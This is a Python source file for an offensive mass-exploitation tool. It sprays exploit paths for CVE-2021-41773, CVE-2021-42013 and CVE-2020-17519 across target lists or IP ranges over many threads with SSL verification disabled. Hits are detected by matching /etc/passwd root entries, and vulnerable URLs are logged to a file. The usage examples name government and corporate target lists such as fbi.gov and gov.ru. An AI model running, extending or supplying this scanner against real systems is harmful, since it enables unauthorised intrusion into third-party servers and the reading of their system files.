#!/usr/bin/python
# coding: utf-8
from modules.debug_mrclw import DebugMrclw
from modules.banner_mrclw import BannerMrclw
from modules.color_mrclw import ColorMrclw
from modules.thread_mrclw import ThreadMrclw
from modules.request_mrclw import RequestMrclw
from modules.file_mrclw import FileMrclw
__author__ = "Cleiton Pinheiro aka MrCl0wn"
__credits__ = ["Cleiton Pinheiro"]
__license__ = "GPL"
__version__ = "0.1"
__maintainer__ = "Cleiton Pinheiro aka MrCl0wn"
__email__ = "mrcl0wnlab@gmail.com"
__git__ = "https://github.com/MrCl0wnLab"
__twitter__ = "https://twitter.com/MrCl0wnLab"


import re
import ssl
import urllib3
import argparse
import textwrap
from datetime import datetime

ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings()

def str_clear(_value_str:str):
    if _value_str:
        _value_str = _value_str.replace("/n", "")
        _value_str = _value_str.replace("/t", "")
    return _value_str

def cs(_color_str: str):
    return OBJ_ColorMrclw.get(_color_str)


def grep_result(_html: str):
    if _html:
        return re.findall(CHECKER_RESULT_REGEX, _html)


def banner():
    print(cs('orange'),
          OBJ_Banner,
          cs('end'))


def ipRange(_start_ip, _end_ip):
    start = list(map(int, _start_ip.split(".")))
    end = list(map(int, _end_ip.split(".")))
    temp = start
    ip_range = []
    ip_range.append(_start_ip)
    while temp != end:
        start[3] += 1
        for i in (3, 2, 1):
            if temp[i] == 256:
                temp[i] = 0
                temp[i-1] += 1
        ip_range.append(".".join(map(str, temp)))
    return ip_range


def get_taget_list():
    target_list = []
    if TARGET_RANGE_STR:
        ip_range = TARGET_RANGE_STR.split(",")
        ip_range_list = ipRange(ip_range[0], ip_range[1])
        if ip_range_list:
            target_list.extend(ip_range_list)

    if FILE_TARGET_STR:
        file_target = OBJ_FileLocal.open_get_lines(FILE_TARGET_STR)
        file_target = [target_clear.replace(
            "\n", '') for target_clear in file_target]
        if file_target:
            target_list.extend(file_target)

    return set(target_list)



def process():
    try:
        target_list = get_taget_list()
        time_str = get_time_now()
        print(cs('white2'), time_str, FIRULA_INF,
              'Range:', TARGET_RANGE_STR, cs('end'))
        print(cs('white2'), time_str, FIRULA_INF,
              'File Exploits:', CONFIG_FILE_EXPLOIT, cs('end'))
        print(cs('white2'), time_str, FIRULA_INF,
              'Total Generated:', len(target_list), cs('end'))

        exploit(target_list)

    except Exception as x:
        print('process', x)
        pass


def process_print(_color1, _date_time, _firula, _target, _color2, _command, _color3, _grep, _color4, _code, _time_final, _color5):
    print(
        cs(_color1), _date_time, _firula, _target,
        cs(_color2), 'COMMAND:', _command,
        cs(_color3), 'RESULT:', _grep,
        cs(_color4), 'CODE:', _code, _time_final,
        cs(_color5)
    )


def get_time_now():
    return str("[ {} ]".format(datetime.now().strftime("%X")))


def exec_exploit(_target, _exploit: list):
    
    try: 
        if _target and _exploit:
            result = None
            _target_clear = str_clear(_target)
            _exploit_clear = str_clear(_exploit[1])
            _protocol = f"{OBJ_RequestMrclw.protocol}://"
            _target_exploit = _target_clear+_exploit_clear
            _protocol_target_exploit = _protocol+_target_exploit
            
            target_url, result, code_http, time_final = OBJ_RequestMrclw.send_request(
                _target_exploit, None)
            time_str = get_time_now()
            
            if  isinstance(code_http, int):
                OBJ_FileLocal.save_result(
                    f"{_protocol_target_exploit}, {_exploit[0]} \n", f'output/{code_http}.txt')

            if (code_http == 200) and (grep_result(result)):
                process_print(
                    'yellow', time_str, FIRULA_OK, _protocol_target_exploit,
                    'cyan', _exploit[0],
                    'green', result,
                    'light_green', code_http, time_final,
                    'end',
                )
                OBJ_FileLocal.save_result(
                    f"{_protocol_target_exploit}, {_exploit[0]} \n", f'output/vuln.txt')
                return

            if code_http == 200:
                
                process_print(
                    'yellow', time_str, FIRULA_INF, _protocol_target_exploit,
                    'cyan', _exploit[0],
                    'green', str(),
                    'light_green', code_http, time_final,
                    'end',
                )
                return

            process_print(
                'red', time_str, FIRULA_ERR, _protocol_target_exploit,
                'light_red', _exploit[0],
                'dark_grey', result,
                'red', code_http, time_final,
                'end'
            )
    except:
        pass


def exploit(_target: str):

    try:
        for key in LOCAL_EXPLOIT_LIST:
            _exploit = LOCAL_EXPLOIT_LIST.get(key)
            try:
                OBJ_ThreadMrclw.exec_thread(
                    exec_exploit, _target, [key, _exploit])
            except:
                pass
        return
    except:
        pass


def load_json(_file_str: str):
    return OBJ_FileLocal.open_file_json(_file_str)


if __name__ == '__main__':

    OBJ_FileLocal = FileMrclw()
    OBJ_ThreadMrclw = ThreadMrclw()
    OBJ_RequestMrclw = RequestMrclw()
    OBJ_ColorMrclw = dict(ColorMrclw())
    OBJ_Banner = BannerMrclw()
    OBJ_Debug = DebugMrclw()

    ASSETS_STR = 'assets/'
    CONFIG_JSON = load_json(ASSETS_STR+'config.json')

    CONFIG_FILE_EXPLOIT = CONFIG_JSON['config']['files_assets']['exploits']
    CONFIG_THREAD = int(CONFIG_JSON['config']['threads'])
    CONFIG_SHODAN_KEY = CONFIG_JSON['config']['api']['shodan']

    CHECKER_RESULT_REGEX = r'(root:.*:0:+)'

    LOCAL_EXPLOIT_LIST = load_json(CONFIG_FILE_EXPLOIT)

    FIRULA_INF = '[ INF ]'
    FIRULA_OK = '[ VUN ]'
    FIRULA_ERR = '[ ERR ]'

    parser = argparse.ArgumentParser(
        prog = 'tool',
        formatter_class = argparse.RawDescriptionHelpFormatter,
        description = textwrap.dedent(
        '''\
    [!] Check: CVE-2021-41773, CVE-2021-42013, CVE-2020-17519
    [!] File exploits: /assets/exploits.json
    [!] Output: output/vuln.txt

    python main.py --file gov.br.txt  --thread 15
    python main.py --file tesla.txt  --ssl
    python main.py --range 192.168.15.1,192.168.15.100 --thread 30 
    python main.py --file fbi.gov.txt  --thread 15 --timeout 3 
    python main.py --file gov.ru.txt  --debug
    ''') 
    )

    banner()

    parser.add_argument('--file', help = 'Input your target host lists',
                        metavar = '<ips.txt>',  required = False)
    parser.add_argument('--range', help = 'Set range IP Eg.: 192.168.15.1,192.168.15.100',
                        metavar = '<ip-start>,<ip-end>', required = False)
    parser.add_argument('--thread', '-t', help = 'Eg. 20',
                        metavar = '<20>', default = CONFIG_THREAD, required = False)

    parser.add_argument('--ssl', help = 'Enable request with SSL ',
                        action = 'store_true', default = False)
    parser.add_argument('--timeout', help = 'Set connection timeout',
                        default = 5, metavar = '<5>', required = False)
    parser.add_argument('--debug', '-d', help = 'Enable debug mode ',
                        action = 'store_true', default = False)

    arg_menu = parser.parse_args()

    if not (arg_menu.file or arg_menu.range):
        exit(parser.print_help())

    if arg_menu.debug:
        OBJ_Debug.debug()

    FILE_TARGET_STR = arg_menu.file
    TARGET_RANGE_STR = arg_menu.range


    FORCE_HTTPS = arg_menu.ssl
    MAX_CONECTION_THREAD = int(arg_menu.thread)
    TIMEOUT_REQUEST = int(arg_menu.timeout)

    OBJ_RequestMrclw.protocol = 'https' if FORCE_HTTPS else 'http'

    process()
